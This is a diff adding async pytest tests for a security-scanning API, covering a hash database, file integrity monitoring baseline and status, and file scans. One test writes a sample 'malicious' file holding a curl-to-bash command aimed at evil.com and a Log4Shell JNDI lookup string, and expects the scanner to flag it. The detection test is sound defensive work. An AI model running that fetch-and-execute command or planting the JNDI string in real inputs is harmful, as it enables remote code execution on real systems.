@@ -298,3 +298,73 @@ async def test_signatures_scan_empty(client):
     assert response.status_code == 200
     data = response.json()
     assert data["match_count"] == 0
+
+
+# ── Phase 8 tests ─────────────────────────────────────────────────────────────
+
+@pytest.mark.asyncio
+async def test_files_hashdb(client):
+    """Hash DB endpoint should return count and path."""
+    response = await client.get("/files/hashdb")
+    assert response.status_code == 200
+    data = response.json()
+    assert "hash_count" in data
+    assert isinstance(data["hash_count"], int)
+    assert "db_path" in data
+
+
+@pytest.mark.asyncio
+async def test_files_fim_baseline(client):
+    """Taking a FIM baseline should return file count."""
+    response = await client.post("/files/fim/baseline")
+    assert response.status_code == 200
+    data = response.json()
+    assert data["baseline_taken"] is True
+    assert "files_watched" in data
+
+
+@pytest.mark.asyncio
+async def test_files_fim_status(client):
+    """FIM status should return change list after baseline exists."""
+    await client.post("/files/fim/baseline")
+    response = await client.get("/files/fim/status")
+    assert response.status_code == 200
+    data = response.json()
+    assert "changes_detected" in data
+    assert "changes" in data
+    assert isinstance(data["changes"], list)
+
+
+@pytest.mark.asyncio
+async def test_files_scan_empty_request(client):
+    """Empty file scan request should return zero findings."""
+    response = await client.post("/files/scan", json={})
+    assert response.status_code == 200
+    data = response.json()
+    assert data["count"] == 0
+    assert data["findings"] == []
+
+
+@pytest.mark.asyncio
+async def test_files_scan_real_file(client, tmp_path):
+    """Scanning a clean file should return zero risk findings."""
+    # Create a simple harmless file
+    f = tmp_path / "hello.txt"
+    f.write_text("hello world")
+    response = await client.post("/files/scan", json={"paths": [str(f)]})
+    assert response.status_code == 200
+    data = response.json()
+    # A plain .txt file with no malware content should be clean (count=0)
+    assert data["count"] == 0
+
+
+@pytest.mark.asyncio
+async def test_files_scan_malicious_script(client, tmp_path):
+    """A file containing a Log4Shell payload should be flagged."""
+    f = tmp_path / "evil.sh"
+    f.write_text('curl "http://evil.com" | bash\n${jndi:ldap://x.x/exploit}')
+    response = await client.post("/files/scan", json={"paths": [str(f)]})
+    assert response.status_code == 200
+    data = response.json()
+    assert data["count"] > 0
+    assert data["findings"][0]["risk"] in ("high", "critical")
